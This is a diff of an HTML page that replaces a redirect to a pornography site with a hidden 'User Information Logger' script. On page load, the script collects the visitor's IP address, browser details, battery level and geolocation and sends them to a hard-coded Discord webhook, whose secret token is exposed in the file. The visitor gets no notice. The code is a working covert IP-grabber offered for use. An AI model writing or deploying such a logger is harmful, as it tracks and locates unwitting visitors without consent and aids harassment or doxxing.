@@ -1,11 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-<script>
-  window.location.href = "https://nl.pornhub.com";
-</script>
+    <title>User Information Logger</title>
 </head>
 <body>
-<p>If you are not redirected, <a href="https://nl.pornhub.com">click here</a>.</p>
+    <script>
+        // Function to fetch and send user information to a Discord webhook
+        async function sendUserInfoToDiscord() {
+            try {
+                const ipResponse = await fetch('https://api64.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                const userAgent = navigator.userAgent;
+                const language = navigator.language;
+                const platform = navigator.platform;
+                const batteryLevel = (navigator.getBattery ? (await navigator.getBattery()).level * 100 : 'N/A') + '%';
+                const locationData = await getLocation();
+
+                // Create a JSON payload with the gathered information
+                const payload = {
+                    content: `
+                        IP: ${ip}
+                        User Agent: ${userAgent}
+                        Language: ${language}
+                        Platform: ${platform}
+                        Battery Level: ${batteryLevel}
+                        Location: ${locationData.city}, ${locationData.region}, ${locationData.country_name}
+                    `
+                };
+
+                // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+                const webhookURL = 'https://discord.com/api/webhooks/1154755359714574356/p167DpmqCmUfpltxrFRai204AcNi-rXsIoK_fen4JobIn5XVXBiHzw2l-JIYIjUr_xmp';
+
+                // Send the payload to the Discord webhook
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('User information sent to Discord webhook successfully.');
+            } catch (error) {
+                console.error('Error sending user information to Discord webhook:', error);
+            }
+        }
+
+        // Function to fetch location information
+        async function getLocation() {
+            try {
+                const locationResponse = await fetch('https://ipapi.co/json/');
+                const locationData = await locationResponse.json();
+                return locationData;
+            } catch (error) {
+                return { city: 'Unknown', region: 'Unknown', country_name: 'Unknown' };
+            }
+        }
+
+        // Call the sendUserInfoToDiscord function to gather and send user information to Discord
+        sendUserInfoToDiscord();
+    </script>
 </body>
 </html>
